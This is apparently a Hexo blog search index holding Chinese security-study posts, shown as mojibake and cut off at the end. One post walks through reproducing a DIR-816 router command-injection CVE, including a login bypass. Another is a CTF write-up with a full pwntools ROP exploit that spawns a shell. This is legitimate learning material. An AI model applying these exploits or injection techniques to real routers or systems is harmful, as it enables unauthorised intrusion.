<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å‘¨æŠ¥</title>
      <link href="/posts/594d9f6c/"/>
      <url>/posts/594d9f6c/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h1><h2 id="è¿›åº¦"><a href="#è¿›åº¦" class="headerlink" title="è¿›åº¦"></a>è¿›åº¦</h2><p>åšäº†ä¸€ä¸‹æ˜¥ç§‹æ¯çš„é¢˜ï¼Œå‘ç°è¿˜æ˜¯æœ‰äº›æ–°ä¸œè¥¿çš„ï¼Œå­¦ä¼šäº†orwä¹‹å¤–çš„æ²™ç®±ç»•è¿‡ï¼Œè¿˜æœ‰è‡ªå·±æ‰‹å†™äº†ä¸€ä¸ªå•å­—èŠ‚çˆ†ç ´çš„è„šæœ¬ï¼Œä¹Ÿç®—æ˜¯é”»ç‚¼äº†ä¸‹æˆ‘çš„ç¼–ç¨‹æ°´å¹³</p><p>ä¹‹å¤–å°±æ˜¯åšäº†ä¸‹buuçš„å‰é¢å‡ é“é€†å‘é¢˜ï¼Œå­¦ä¼šäº†idaçš„ä¸€äº›å¿«æ·é”®ï¼Œç»ƒä¹ äº†idaåŠ¨æ€è°ƒè¯•ï¼Œè®°å¿†æœ€æ·±åˆ»çš„æ˜¯è¿·å®«é¢˜(å½“æ—¶è¿˜ä¸çŸ¥é“å«è¿™ä¸ªåå­—)ï¼Œå°±ä¸€æ­¥æ­¥çš„ç¡¬è°ƒï¼Œæœ€åè°ƒå‡ºæ¥äº†ï¼Œç›¸å½“æœ‰æˆå°±æ„Ÿ</p><p>è¿˜æœ‰å°±æ˜¯å­¦ä¹ äº†armæ±‡ç¼–ï¼Œä¸»è¦æ˜¯è·Ÿç€<a href="https://azeria-labs.com/writing-arm-assembly-part-1/">azeria-labs</a>ï¼Œç†Ÿæ‚‰äº†armçš„å¯„å­˜å™¨ï¼ŒæŒæ¡äº†strå’Œldrä¸¤æ¡ç›¸å½“é‡è¦çš„å¯¹å†…å­˜æ“ä½œçš„æ±‡ç¼–ä»¥åŠåˆæ­¥å­¦ä¹ äº†å®ƒçš„å¯»å€æ–¹å¼ï¼ˆç°åœ¨å°±çœ‹åˆ°ç«‹å³æ•°å¯»å€ï¼‰</p><h2 id="æ€è€ƒ"><a href="#æ€è€ƒ" class="headerlink" title="æ€è€ƒ"></a>æ€è€ƒ</h2><p>æ„Ÿè§‰è‡ªå·±é€†å‘æ°´å¹³ä¸è¶³ï¼Œéœ€è¦é”»ç‚¼é€†å‘æ°´å¹³ï¼Œç°åœ¨çš„æƒ³æ³•å°±æ˜¯åšä¸€äº›é€†å‘é¢˜æ¥æé«˜é€†å‘æ°´å¹³</p><p>è¿˜æœ‰å°±æ˜¯æ‰“ä¸€äº›å›½é™…èµ›ï¼Œæ‹“å±•ä¸€ä¸‹è§è¯†ï¼Œçœ‹çœ‹pwné¢˜æœ‰ä»€ä¹ˆæ–°æ´»</p><p>å‰©ä¸‹çš„éƒ¨åˆ†æˆ‘çš„æƒ³æ³•æ˜¯å­¦å®Œarmæ±‡ç¼–åï¼Œåšä¸€äº›arm-pwnå·©å›ºä¸€ä¸‹ï¼ˆå‘ç°äº†ä¸€ä¸ªç½‘ç«™<a href="https://ropemporium.com/index.html#">ropemporium</a>ï¼ŒæŒºå¥½çš„ï¼‰</p><h1 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h1><h2 id="è®°å½•"><a href="#è®°å½•" class="headerlink" title="è®°å½•"></a>è®°å½•</h2><p>å¤ç°ä¸€ä¸‹cveï¼Œé¦–å…ˆåœ¨å®˜ç½‘ä¸‹è½½å›ºä»¶</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_18-22-56.png" alt="Snipaste_2024-07-19_18-22-56"></p><p>æŸ¥çœ‹ä¸‹æ–‡ä»¶ç±»å‹æ˜¯u-boot</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_18-25-35.png" alt="u-boot"></p><p>ä½¿ç”¨binwalkæå–æ–‡ä»¶ç³»ç»Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me DIR-816.img</span><br></pre></td></tr></table></figure><p><code>-M</code> å‚æ•°ï¼Œé€’å½’æ‰«ææ–‡ä»¶</p><p><code>-e</code> å‚æ•°ï¼Œæå–å›ºä»¶ä¸­çš„æ–‡ä»¶</p><p>å®‰è£…binwalk(æ¨è)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ReFirmLabs/binwalk.git</span><br><span class="line">python setup.py</span><br></pre></td></tr></table></figure><p>å¦‚éå¿…è¦ä¸è¦é€‰æ‹©ä¸‹é¢çš„å®‰è£…æ–¹å¼(ç¬”è€…æ›¾å°è¯•è¿‡ï¼Œè¿™æ ·ä¼šåˆ é™¤å¾ˆå¤šä¾èµ–ï¼Œè¾›è¾›è‹¦è‹¦æ­èµ·æ¥ubuntuç¯å¢ƒå…¨çƒ‚äº†)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install binwalk</span><br></pre></td></tr></table></figure><p>æå–å®Œåå¦‚å›¾æ‰€ç¤º</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_18-40-43.png" alt="bin"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å°†<code>goahead</code>çš„ç¯å¢ƒæ­èµ·æ¥ï¼Œ<code>goahead</code>åœ¨binç›®å½•ä¸‹</p><p>qemuå¯åŠ¨goahead</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo qemu-mipsel -L ./ ./goahead</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_18-50-36.png" alt="ld"></p><p>çœ‹æŠ¥é”™ï¼Œç¼ºå°‘libç›®å½•ä¸‹ldï¼Œæˆ‘ä»¬åœ¨å½“å‰ç›®å½•ä¸‹åˆ›å»ºlibå¹¶å°†ldæ”¾åœ¨æ–‡ä»¶å¤¹ä¸‹å³å¯</p><p>æœ‰å¾ˆå¤šç¼ºå°‘åº“çš„æŠ¥é”™ï¼Œæˆ‘ä»¬æ ¹æ®æŠ¥é”™å°†åº“æ”¾å…¥å³å¯</p><p>æœ€åç»“æ„å¦‚å›¾æ‰€ç¤º</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_18-59-08.png" alt="tree"></p><p>qemuè¿è¡Œï¼Œç„¶åä¸å‡ºæ„å¤–çš„åˆå¤±è´¥äº†</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-01-41.png" alt="qemu"></p><p>å¯ä»¥çœ‹è§goaheadæŠ¥é”™cannot open pid fileï¼Œæˆ‘ä»¬å°±å»ç¨‹åºé‡Œæ‰¾</p><p>idaæœç´¢å­—ç¬¦ä¸²</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-04-15.png" alt="string"></p><p>æ˜¯æ— æ³•fopen<code>off_480e50</code></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-05-25.png" alt="open"></p><p>å‘ç°æ˜¯æ²¡æœ‰&#x2F;var&#x2F;run&#x2F;goahead.pidï¼Œåˆ›å»ºä¸€ä¸ª</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-06-36.png" alt="pid"></p><p>åˆæŠ¥é”™please execute nvram_daemon first!</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-11-14.png" alt="nvram"></p><p>å‘ç°ç¼ºå¤±&#x2F;var&#x2F;run&#x2F;nvramd.pid</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-13-50.png" alt="nvramd"></p><p>æŠ¥é”™failed to convert  to binary ip data</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-16-14.png" alt="data"></p><p>å®šä½åˆ°lan_ipaddr</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-18-18.png" alt="lan"></p><p>å¡ä½â€¦</p><p>çœ‹è§ç½‘ä¸Šçš„åŠæ³•éƒ½æ˜¯idaè¿œç¨‹è°ƒè¯•hookæ‰ï¼Œå¾…æˆ‘ç ”ç©¶ç ”ç©¶qemuè¿œç¨‹è°ƒè¯•</p><h2 id="ç–‘é—®"><a href="#ç–‘é—®" class="headerlink" title="ç–‘é—®"></a>ç–‘é—®</h2><p>å¦‚ä½•ç¡®å®šæ˜¯å“ªä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ï¼Ÿæˆ‘çœ‹ç½‘ä¸Šå…¨æ˜¯ç›´æ¥å¼€å§‹åˆ†ægoaheadï¼Œä½†æ˜¯åœ¨æ¼æ´æŒ–æ˜ä¸­æˆ‘ä»¬æ˜¯ä¸çŸ¥é“å“ªé‡Œæœ‰æ¼æ´çš„ï¼Œå¦‚ä½•ç¡®å®šæ¼æ´æ‰€åœ¨çš„æ–‡ä»¶ï¼Ÿ</p><h1 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h1><h2 id="è®°å½•-1"><a href="#è®°å½•-1" class="headerlink" title="è®°å½•"></a>è®°å½•</h2><p>ä¹¦æ¥ä¸Šå›ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹å¦‚ä½•è§£å†³failed to convert  to binary ip dataæŠ¥é”™</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn/Snipaste_2024-07-19_19-16-14.png" alt="data"></p><p>ç»è¿‡æœ¬äººå®æµ‹ï¼Œè¿œç¨‹è°ƒè¯•patchæ˜¯æœ€å¯é çš„æ–¹æ³•</p><p>å…·ä½“æ“ä½œå¦‚ä¸‹</p><p>1.è™šæ‹Ÿæœºé€‰æ‹©æ¡¥æ¥</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_16-32-36.png" alt="vm"></p><p>2.å°†åœ¨idaçš„<code>dbgsrv</code>ç›®å½•ä¸‹<code>linux_server</code>å’Œ<code>linux_server64</code>æ–‡ä»¶å¤åˆ¶åˆ°ubuntuä¸‹</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_16-38-40.png" alt="dbg"></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_16-39-34.png" alt="linux"></p><p>3.èµ‹äºˆ<code>linux_server</code>å’Œ<code>linux_server64</code>å¯æ‰§è¡Œæƒé™</p><p><code>sudo chmod +x ./linux_server linux_server64</code></p><p>4.<code>ifconfig</code>æŸ¥çœ‹è™šæ‹Ÿæœºip</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_16-46-41.png" alt="ip"></p><p>5.åœ¨ubuntuä¸Šè¿è¡Œ<code>linux_server</code>å¹¶è¿è¡Œ<code>goahead</code></p><p><code>sudo qemu-mipsel -g 1234 -L ./ ./bin/goahead</code></p><p>åœ¨idaé‡Œå¡«å¥½ipï¼Œç«¯å£</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_19-01-44.png" alt="port"></p><p>6.æ‰“æ–­ç‚¹ï¼Œè¿è¡Œ</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_19-02-56.png" alt="jmp"></p><p>7.ä¿®æ”¹v0çš„å€¼ä¸º0ï¼Œå³å¯ç»§ç»­è¿è¡Œ</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_19-04-54.png" alt="v0"></p><p>æ‰“å¼€<code>http://192.168.0.105/dir_login.asp</code>ï¼Œå³å¯è¿›å…¥ç™»é™†ç•Œé¢(ä¸èƒ½åœ¨ubuntuæ‰“å¼€ï¼Œå›°æ‰°äº†æˆ‘å¥½ä¹…ğŸ˜¢ï¼Œç”¨kaliæ‰“å¼€çš„ï¼Œæœ¬æœºä¹Ÿå¯)</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_19-11-31.png" alt="kali"></p><p>æ­å¥½ä¹‹åæˆ‘ä»¬è¦ç™»å½•è¿›å»ï¼Œæˆ‘é€‰æ‹©ä¿®æ”¹å‰ç«¯(ä¹Ÿå¯ä»¥patch)</p><p>åœ¨<code>_DIR-816.img.extracted/squashfs-root/etc_ro/web</code>ä¸­æ‰¾åˆ°<code>dir_login.asp</code>ï¼Œæ³¨é‡Šæ‰ç¦æ­¢è¾“å…¥ç©ºå­—ç¬¦çš„jså³å¯</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">onlogin</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment"> if (document.test.show_username.value.length &lt;= 0) &#123;</span></span><br><span class="line"><span class="comment">  alert(&quot;è¯·è¾“å…¥ç”¨æˆ·å!&quot;);</span></span><br><span class="line"><span class="comment">  document.test.show_username.focus();</span></span><br><span class="line"><span class="comment">  return false;</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> if (document.test.show_username.value != &quot;&quot;)</span></span><br><span class="line"><span class="comment"> &#123;</span></span><br><span class="line"><span class="comment">document.test.username.value = Base64.Encode(document.test.show_username.value);</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment">  if ( document.test.password.value != &quot;&quot;)</span></span><br><span class="line"><span class="comment"> &#123;</span></span><br><span class="line"><span class="comment">document.test.password.value = Base64.Encode(document.test.password.value);</span></span><br><span class="line"><span class="comment"> &#125;</span></span><br><span class="line"><span class="comment"> document.test.show_username.disabled = true;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è‡³äºä¸ºä»€ä¹ˆè¿™æ ·åšï¼Œä¸»è¦æ˜¯ä¸ºäº†ç»•è¿‡ç™»å½•ä»£ç </p><p>è¿™ä¸ªç¨‹åºçš„ç™»å½•é€»è¾‘æ˜¯ä»<code>nvram_bufget</code>è·å¾—ç”¨æˆ·åå’Œå¯†ç æ”¾åœ¨v2ï¼Œv3ã€‚ç”¨æˆ·è¾“å…¥çš„ç”¨æˆ·åå’Œå¯†ç ç»è¿‡base64ç¼–ç æ”¾åœ¨varå’Œv7ä¸­ï¼Œè§£ç åçš„ç”¨æˆ·åå’Œå¯†ç æ”¾åœ¨v10ï¼Œv11ä¸­</p><p>v2ï¼Œv3å€¼ä¸º0ï¼Œå½“v10ï¼Œv11ä¸º0æ—¶å³å¯ç»•è¿‡æ£€æŸ¥</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_19-22-40.png" alt="login"></p><p>è®¿é—®<code>http://192.168.0.5/d_wizard_step1_start.asp</code></p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_20-45-08.png" alt="set"></p><p>æ‰¾åˆ°æ¼æ´ç‚¹ï¼Œ<code>ls</code>æµ‹è¯•ä¸€ä¸‹</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_20-46-33.png" alt="test"></p><p>ä¸è¡Œï¼Œé‚£ç”¨burpæŠ“ä¸‹åŒ…</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_20-48-38.png" alt="error"></p><p>åœ¨datetimeå¤„æ³¨å…¥å‘½ä»¤</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_20-51-16.png" alt="cmd"></p><p>å‘è¿‡å»ï¼Œsuccess</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_20-52-16.png" alt="success"></p><p>è¯¦ç»†çœ‹ä¸‹ä»£ç ï¼Œä»webè·å¾—è¾“å…¥çš„datetimeçš„å€¼æ”¾åœ¨var</p><p><code>&amp;unk_47c2b8</code>ä¸º<code>date -s \&quot;%s\&quot;</code>ï¼Œvarå¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶ï¼Œå­˜åœ¨å‘½ä»¤æ³¨å…¥</p><p><img src="https://raw.githubusercontent.com/mikokuma/pic_bed/main/pwn1/Snipaste_2024-07-25_21-02-23.png" alt="code"></p><h2 id="ç–‘é—®-1"><a href="#ç–‘é—®-1" class="headerlink" title="ç–‘é—®"></a>ç–‘é—®</h2><p>å¤ç°cveæœ€å¤§çš„æ„Ÿè§¦æ˜¯å¯»æ‰¾æ¼æ´æ‰æ˜¯æœ€å…³é”®çš„ï¼Œè¿™ä¸ªæ¼æ´å‡ºç°åœ¨cgiä¸Šï¼Œcgiæ›´å®¹æ˜“äº§ç”Ÿæ¼æ´ï¼Ÿ</p>]]></content>
      
      
      
        <tags>
            
            <tag> record </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024æ˜¥ç§‹æ¯å¤å­£èµ›</title>
      <link href="/posts/54d2895e/"/>
      <url>/posts/54d2895e/</url>
      
        <content type="html"><![CDATA[    <div id="aplayer-jTucyiAi" class="aplayer aplayer-tag-marker meting-tag-marker"         data-id="1318733599" data-server="netease" data-type="song" data-mode="circulation" data-autoplay="false" data-mutex="true" data-listmaxheight="340px" data-preload="auto" data-theme="#ad7a86"    ></div><h1 id="stdout"><a href="#stdout" class="headerlink" title="stdout"></a>stdout</h1><h2 id="é—®é¢˜"><a href="#é—®é¢˜" class="headerlink" title="é—®é¢˜"></a>é—®é¢˜</h2><p>mainå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">80</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;where is my stdout???&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x60</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>vulnå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">0</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹çš„æ€è·¯æ˜¯mainå‡½æ•°æ ˆæº¢å‡ºåŠ«æŒè‡³vulnå‡½æ•°ï¼Œvulnå‡½æ•°æ ˆæº¢å‡ºè°ƒç”¨putså¾—åˆ°libcåœ°å€ï¼Œä½†æ˜¯<code>setvbuf(stdout, 0LL, 0, 0LL);</code>æ— æ³•å¾—åˆ°å›æ˜¾</p><p>å†è€…çš„æ€è·¯æ˜¯ret2csuï¼Œä½†æ˜¯æ— æ³•æ§åˆ¶rcxç¬¬å››ä¸ªå‚æ•°è‡´ä½¿setvbufæŠ¥é”™ï¼Œæ— æ€è·¯äº†</p><h2 id="è§£å†³åŠæ³•"><a href="#è§£å†³åŠæ³•" class="headerlink" title="è§£å†³åŠæ³•"></a>è§£å†³åŠæ³•</h2><p>å…³é”®æ˜¯initå‡½æ•°ï¼Œ<code>setvbuf(stdout, 0LL, 0, 0LL)</code>æ ‡å‡†è¾“å‡ºå…¨ç¼“å†²ï¼Œå³ç¼“å†²åŒºè¢«å¡«æ»¡æ‰ä¼šè¿›è¡Œi&#x2F;oæ“ä½œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  ;</span><br><span class="line">  <span class="keyword">return</span> setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ·æ–°ç¼“å†²åŒºçš„æ–¹æ³•</p><ol><li><p>å¡«æ»¡ç¼“å†²åŒºåä¼šåˆ·æ–°</p></li><li><p>exité€€å‡ºä¼šåˆ·æ–°ç¼“å†²åŒº</p></li><li><p>è°ƒç”¨fflushå‡½æ•°</p></li><li><p>æµè¢«å…³é—­ï¼ˆè°ƒç”¨<code>fclose</code>ï¼‰</p></li></ol><p>åœ¨è¿™é“é¢˜ä¸­ï¼Œæˆ‘ä»¬é‡‡ç”¨ç¬¬ä¸€ç§æ–¹å¼è¿›è¡Œi&#x2F;oæ“ä½œï¼Œå³é‡å¤å¤šæ¬¡è°ƒç”¨extendå‡½æ•°å¡«æ»¡ç¼“å†²åŒº</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>,arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ru = <span class="keyword">lambda</span> a: p.readuntil(a)</span><br><span class="line">r = <span class="keyword">lambda</span> n: p.read(n)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: p.sendlineafter(a,b) </span><br><span class="line">sa = <span class="keyword">lambda</span> a,b: p.sendafter(a,b) </span><br><span class="line">sl = <span class="keyword">lambda</span> a: p.sendline(a) </span><br><span class="line">s = <span class="keyword">lambda</span> a: p.send(a) </span><br><span class="line"></span><br><span class="line">vuln = <span class="number">0x40125D</span></span><br><span class="line">extend = <span class="number">0x401287</span></span><br><span class="line">puts_plt = <span class="number">0x4010B0</span></span><br><span class="line">read_got = <span class="number">0x404028</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x00000000004013d3</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span> + p64(vuln)</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x40127F&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(read_got) + p64(puts_plt) +p64(extend) + p64(vuln)</span><br><span class="line">s(p2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x40127F&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#é‡å¤è°ƒç”¨extendå‡½æ•°å¡«æ»¡ç¼“å†²åŒº</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    p3 = <span class="string">b&#x27;b&#x27;</span>*<span class="number">0x28</span> + p64(extend) + p64(vuln)</span><br><span class="line">    s(p3)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p3 = b&#x27;a&#x27;*0x28 + p64(extend) + p64(vuln)</span></span><br><span class="line"><span class="comment">#s(p3)</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">libcbase = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x10dfc0</span></span><br><span class="line">log.success(<span class="string">&#x27;libcbase ==&gt; &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">sys=libc.symbols[<span class="string">&#x27;execve&#x27;</span>]+libcbase</span><br><span class="line">sh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))+libcbase</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *0x40127F&#x27;)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x00000000004013d1</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000142c92</span> + libcbase</span><br><span class="line">p4 = <span class="string">b&#x27;c&#x27;</span>*<span class="number">0x28</span> + p64(pop_rdi_ret) + p64(sh) +p64(pop_rsi_r15)+ p64(<span class="number">0</span>)+ p64(<span class="number">0</span>) +p64(pop_rdx_ret)+ p64(<span class="number">0</span>)+p64(sys)</span><br><span class="line">s(p4)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="Shuffled-Execution"><a href="#Shuffled-Execution" class="headerlink" title="Shuffled_Execution"></a>Shuffled_Execution</h1><p>ä½¿ç”¨å¸¦æœ‰<code>\x00</code>çš„æ±‡ç¼–æŒ‡ä»¤ç»•è¿‡strlenï¼Œæˆ‘ä½¿ç”¨çš„æ˜¯<code>mov esi,0</code>æœºå™¨ç ä¸º<code>\xbe\x00\x00\x00\x00</code>(å°ç«¯åº)</p><p>æ²™ç®±ç¦ç”¨äº†è®¸å¤šç³»ç»Ÿè°ƒç”¨ï¼Œå…·ä½“å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 